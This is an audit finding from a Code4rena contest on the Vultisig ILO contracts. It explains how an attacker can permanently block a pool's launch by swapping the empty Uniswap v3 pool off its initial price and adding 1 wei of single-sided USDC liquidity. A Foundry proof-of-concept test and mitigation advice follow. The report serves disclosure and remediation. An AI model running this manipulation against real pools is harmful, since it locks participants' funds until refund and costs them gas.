---
tags:
  - lang/solidity
  - sector/dex
  - sector/launchpad
  - sector/stable
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/data-corruption/price-manipulation
  - impact/loss-of-funds/locked-funds
  - trigger/price-manipulation
protocol: "[[Vultisig]]"
auditors:
  - "[[nnez]]"
report: "https://code4rena.com/reports/2024-06-vultisig"
genome:
  - "[[spot-price]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[locked-funds]]"
  - "[[trigger/price-manipulation]]"
  - "[[dos-resistance]]"
  - "[[oracle-manipulation-resistance]]"
  - "[[timestamp-dependence]]"
---
# [H-03] Adversary can prevent the launch of any ILO pool with enough raised capital at any moment by providing single-sided liquidity

- id: 35755
- impact: HIGH
- protocol: [[Vultisig]]
- reporter: nnez (Code4rena)
- source: https://code4rena.com/reports/2024-06-vultisig

## Summary


The report discusses a vulnerability in the ILOPool contract, which can be exploited to prevent the launch of any ILO pool at any time. This can be done at a low cost and can affect the success of the token launch and its future pricing. The vulnerability lies in the ILOManager contract, where a check is made to ensure that the price at the time of the token launch is the same as the one initialized by the project. However, this price can be manipulated in Uniswap v3 Pools when there is no liquidity, and an attacker can also add single-sided liquidity to further complicate the situation. The report suggests mitigating this vulnerability by reserving some amount in the ILO pool for swapping back or using a wrapper token for the sale token. This vulnerability has been confirmed by the project team.

## Details


<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L296>

### Impact

It is possible to prevent the launch of any ILO pool at any time, including pools that have reached their total raised amount. This can be done at any time and the cost for the attacker is negligible.

Not only this is a DOS of the whole protocol, but the attack can be performed at the very end of the sale, making users lose a lot on gas fees, considering it will be deployed on Ethereum Mainnet. Hundreds or thousands of users will participate in ILO pools via `buy()`, and will have to later call `claimRefund()` to get their "raise" tokens back.

Token launches that were deemed to be successful will be blocked after raising funds from many users, and this will most certainly affect the perception of the token, and its pricing on any attempt of a future launch/sale.

### Vulnerability Details

The `ILOManager` contract has a check to assert that the price at the time of the token launch is the same as the one initialized by the project. If they differ the transaction will revert, and the token launch will fail:

```solidity
function launch(address uniV3PoolAddress) external override {
    require(block.timestamp > _cachedProject[uniV3PoolAddress].launchTime, "LT");
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(uniV3PoolAddress).slot0();
@>  require(_cachedProject[uniV3PoolAddress].initialPoolPriceX96 == sqrtPriceX96, "UV3P");
    address[] memory initializedPools = _initializedILOPools[uniV3PoolAddress];
    require(initializedPools.length > 0, "NP");
    for (uint256 i = 0; i < initializedPools.length; i++) {
        IILOPool(initializedPools[i]).launch();
    }

    emit ProjectLaunch(uniV3PoolAddress);
}
```

<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L190>

The problem is that `sqrtPriceX96` can be easily manipulated in Uniswap v3 Pools when there is no liquidity in it via a swap with no cost. In theory, this could be mitigated by anyone by swapping back to get back to the original price. But there is an additional problem which makes the severity of the attack even higher. The attacker can add [single-sided liquidity](https://support.uniswap.org/hc/en-us/articles/20902968738317-What-is-single-sided-liquidity#:\~:text=When%20you%20select%20a%20range%20that%20is%20outside%20the%20current%20price%20range%2C%20you%20will%20only%20be%20able%20to%20supply%20one%20of%20the%20two%20tokens.) to the pool (just the Raise Token) after the price was manipulated.

> When you select a range that is outside the current price range, you will only be able to supply one of the two tokens.

By adding liquidity in ticks greater than the manipulated price, but lower than the expected initial price, it would require the swapper to provide some `SALE_TOKEN`, which should not be available at this moment, since they should all be in the ILO pool.

Even if the project admin has some `SALE_TOKEN`, the attacker can mint a higher amount of liquidity by providing more single-sided `RAISE_TOKEN` liquidity, making the needed amount of `SALE_TOKEN` even higher.

### Proof of Concept

The following Proof of Concept shows how an attacker can make a launch revert after raising capital, at the cost of providing liquidity with only `1 wei` of USDC (Raise Token).

Console Output:

    <<Minting Attack>>
    <<Failed mitigation attempt>>
      
    uniswapV3SwapCallback()
      amount0 (USDC)       0
      amount1 (SALE_TOKEN) 1

This would be enough to perform an attack that can't be reverted in most cases since no other sale tokens should be circulating before the launch. But for the sake of interest, the minted liquidity and the mitigation amount can be increased to check the values needed to get back to the initial price in different situations.

POC:

1. Add the import to the top of `test/ILOManager.t.sol`.
2. Add the test to the `ILOManagerTest` contract in `test/ILOManager.t.sol`.
3. Run `forge test --mt testManipulatePriceForLaunch -vv`.

<details>

```solidity
import "../lib/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "forge-std/console.sol";
```

```solidity
function testManipulatePriceForLaunch() external {
    IILOManager.InitPoolParams memory params = _getInitPoolParams();
    _initPool(PROJECT_OWNER, params);

    assertEq(IUniswapV3Pool(projectId).token0(), USDC);
    assertEq(IUniswapV3Pool(projectId).token1(), SALE_TOKEN);

    vm.label(USDC, "USDC");
    vm.label(SALE_TOKEN, "SALE_TOKEN");
    vm.label(projectId, "UNI_V3_POOL");
    vm.label(address(this), "ATTACKER");

    unsuccessfulPriceManipulation();

    priceManipulationAttack();

    vm.warp(LAUNCH_START+1);
    vm.expectRevert(bytes("UV3P"));
    iloManager.launch(projectId);
}

function unsuccessfulPriceManipulation() internal {
    uint160 initialPrice = mockProject().initialPoolPriceX96;
    uint160 MIN_SQRT_RATIO = 4295128739 + 1;

    // Check price before attack
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);

    // Attack
    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);

    // Mitigation
    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);
}

function priceManipulationAttack() internal {
    uint160 initialPrice = mockProject().initialPoolPriceX96;
    uint160 MIN_SQRT_RATIO = 4295128739 + 1;

    // Check price before attack
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);

    // Attack -> Swap to manipulate price
    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);

    // Attack -> Mint to prevent swapping back
    console.log("\n<<Minting Attack>>");
    deal(USDC, address(this), 1);
    int24 OUTSIDE_TICK = 0;
    IUniswapV3Pool(projectId).mint(address(this), OUTSIDE_TICK-10, OUTSIDE_TICK+10, 1, "");

    // Mitigation doesn't work now
    // You can uncomment the `expectRevert` and run the test with `-vvvv`
    // You'll see the log `ATTACKER::uniswapV3SwapCallback(0, 1, 0x)`, which means that it expects 1 wei of SALE_TOKEN
    // This is not possible as all SALE_TOKENs should be in the ILOPool at this moment
    console.log("\n<<Failed mitigation attempt>>");
    vm.expectRevert(bytes("IIA"));
    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");

    // The price will remain the one set by the attacker
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
}

function uniswapV3MintCallback(uint256, uint256, bytes memory) external {
    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
}

function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory) external {
    assertGe(amount0, 0);
    assertGe(amount1, 0);

    console.log("\nuniswapV3SwapCallback()");
    console.log("amount0 (USDC)      ", uint256(amount0));
    console.log("amount1 (SALE_TOKEN)", uint256(amount1));
}
```

</details>

### Recommended Mitigation Steps

Since the price can be manipulated, and single-sided liquidity can be minted, getting the price back to its initial price would require swapping and providing `SALE_TOKEN`. Since it's an initial sale with vesting for other participants, it is expected that no parties hold the token. But, even if they do, the attack can be performed at some cost anyway as explained before.

So one possible solution could be to reserve some amount in the ILO pool in case it needs to be swapped back, and perform a swap before the liquidity is added to the Uniswap Pool, taking into account an amount that would make the attack very expensive to rollback. Another approach could involve having a wrapper token around the `SALE_TOKEN` that can be minted and swapped to reach the expected price.

This is a potential first step. Additional considerations shall be taken into account, like an attacker minting liquidity on various tick ranges, which may also affect calculations.

### Assessed type

Uniswap

**[Haupc (Vultisig) confirmed](https://github.com/code-423n4/2024-06-vultisig-findings/issues/41#event-13596663998)**

***
